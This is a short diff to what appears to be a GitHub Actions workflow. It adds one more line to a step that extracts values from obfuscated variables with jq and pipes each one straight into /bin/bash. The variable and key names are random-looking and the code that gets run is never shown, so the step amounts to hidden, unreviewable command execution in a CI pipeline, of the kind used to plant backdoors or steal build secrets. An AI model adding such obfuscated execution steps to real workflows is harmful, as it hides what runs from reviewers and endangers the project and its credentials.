@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$zamaf1" | jq -r .gxy141 | /bin/bash
           echo $pea77 | jq -r .vlmr15 | /bin/bash
           echo $tiso8651 | jq -r .me1 | /bin/bash
+          echo $g53 | jq -r .qcyx404 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
